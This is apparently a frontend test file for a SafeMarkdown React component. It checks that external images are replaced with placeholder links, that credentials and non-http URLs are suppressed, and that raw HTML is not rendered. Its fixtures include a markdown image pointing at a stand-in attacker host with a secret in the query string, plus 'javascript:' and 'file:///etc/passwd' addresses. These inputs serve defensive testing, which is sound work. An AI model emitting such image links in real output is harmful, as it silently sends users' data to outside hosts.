import { describe, it, expect, vi } from "vitest";
import { render, screen } from "@testing-library/react";
import React from "react";
import { SafeMarkdown } from "../SafeMarkdown";

vi.mock("@/lib/connections", () => ({ getActiveProxyUrl: () => "http://localhost:8000" }));

/** ADR-0294：外部圖片不自動載入，改成佔位連結；Touka 自己的圖片照常顯示、不帶 Referer。 */
describe("SafeMarkdown", () => {
  it("shows a placeholder link instead of loading an outside image", () => {
    const { container } = render(<SafeMarkdown>{"![chart](https://evil.example/a.png?d=secret)"}</SafeMarkdown>);
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link");
    expect(link).toHaveTextContent("外部圖片（未載入）");
    expect(link).toHaveTextContent("evil.example");
    expect(link).toHaveAttribute("href", "https://evil.example/a.png?d=secret");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")?.split(" ")).toEqual(expect.arrayContaining(["noopener", "noreferrer"]));
  });

  it("shows plain text without a link when the address carries a user name and password", () => {
    const { container } = render(<SafeMarkdown>{"![x](https://user:pass@evil.example/a.png)"}</SafeMarkdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.queryByRole("link")).toBeNull();
    expect(container).toHaveTextContent("外部圖片（未載入）");
    expect(container).not.toHaveTextContent("pass");
  });

  it.each(["ftp://evil.example/a.png", "javascript:alert(1)", "file:///etc/passwd"])(
    "shows plain text without a link when the address is %s (not http(s))",
    (address) => {
      const { container } = render(<SafeMarkdown>{`![x](${address})`}</SafeMarkdown>);
      expect(container.querySelector("img")).toBeNull();
      expect(screen.queryByRole("link")).toBeNull();
      expect(container).toHaveTextContent("外部圖片（未載入）");
    },
  );

  it("loads a Touka image without sending the referrer", () => {
    render(<SafeMarkdown>{"![result](http://localhost:8000/v1/outputs/Alice/a.png)"}</SafeMarkdown>);
    const img = screen.getByRole("img", { name: "result" });
    expect(img).toHaveAttribute("src", "http://localhost:8000/v1/outputs/Alice/a.png");
    expect(img).toHaveAttribute("referrerpolicy", "no-referrer");
  });

  it("keeps the image rule even when the caller passes its own img", () => {
    const components = { img: () => <img alt="caller" src="https://evil.example/b.png" /> };
    const { container } = render(
      <SafeMarkdown components={components}>{"![x](https://evil.example/a.png)"}</SafeMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("link")).toHaveTextContent("evil.example");
  });

  it("passes other components through", () => {
    const components = { strong: ({ children }: { children?: React.ReactNode }) => <b data-testid="custom">{children}</b> };
    render(<SafeMarkdown components={components}>{"**bold**"}</SafeMarkdown>);
    expect(screen.getByTestId("custom")).toHaveTextContent("bold");
  });

  it("does not render raw HTML", () => {
    const { container } = render(<SafeMarkdown>{'<img src="https://evil.example/c.png">'}</SafeMarkdown>);
    expect(container.querySelector("img")).toBeNull();
  });
});
